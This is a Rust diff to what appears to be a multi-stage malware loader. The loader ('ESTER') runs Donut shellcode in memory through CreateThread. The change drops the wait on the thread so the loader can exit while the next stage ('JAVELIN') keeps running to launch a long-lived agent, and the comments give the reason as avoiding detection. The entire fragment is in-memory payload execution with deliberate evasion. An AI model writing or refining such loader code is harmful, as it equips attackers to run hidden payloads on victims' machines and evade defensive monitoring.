@@ -127,11 +127,12 @@ fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
         
         // Create a thread to execute the shellcode
         // This is the correct way to execute donut shellcode
+        // NOTE: We do NOT wait for the thread to complete because JAVELIN will
+        // spawn the agent which is a long-running process. ESTER should exit
+        // after spawning JAVELIN to avoid detection.
         #[cfg(target_os = "windows")]
         {
             use winapi::um::processthreadsapi::CreateThread;
-            use winapi::um::synchapi::WaitForSingleObject;
-            use winapi::um::winbase::INFINITE;
             
             let thread_handle = CreateThread(
                 std::ptr::null_mut(),  // Default security
@@ -146,8 +147,9 @@ fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
                 return Err("Failed to create thread for shellcode execution".into());
             }
             
-            // Wait for the shellcode thread to complete
-            WaitForSingleObject(thread_handle, INFINITE);
+            // Do NOT wait for thread - let JAVELIN run asynchronously
+            // The thread will continue running even after ESTER exits
+            crate::debug_print!("[STAGE_TRIGGER] JAVELIN thread spawned successfully (running asynchronously)");
         }
         
         #[cfg(not(target_os = "windows"))]
